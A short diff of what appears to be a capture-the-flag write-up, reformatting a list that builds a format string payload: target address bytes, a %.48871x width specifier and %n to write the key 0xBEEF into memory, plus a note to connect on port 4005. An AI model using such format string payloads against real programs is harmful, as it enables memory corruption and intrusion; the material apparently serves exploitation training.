@@ -462,10 +462,10 @@ Now by looking at the code on main.c, we can see that the key is 0xbeef
 We know that we have already written 8 chars so far, so 0xBEEF = 48879 - 8 = 48871
 
 Address for %x + address for %n + '%.Ax' + '%n'
-%x = \x34\xC0\x04\x08
-%n = \x34\xC0\x04\x08
-%.Ax = %.48871x
-%n = %n 
+- %x = \x34\xC0\x04\x08
+- %n = \x34\xC0\x04\x08
+- %.Ax = %.48871x
+- %n = %n 
 
 We also need to change the connection to 4005
 
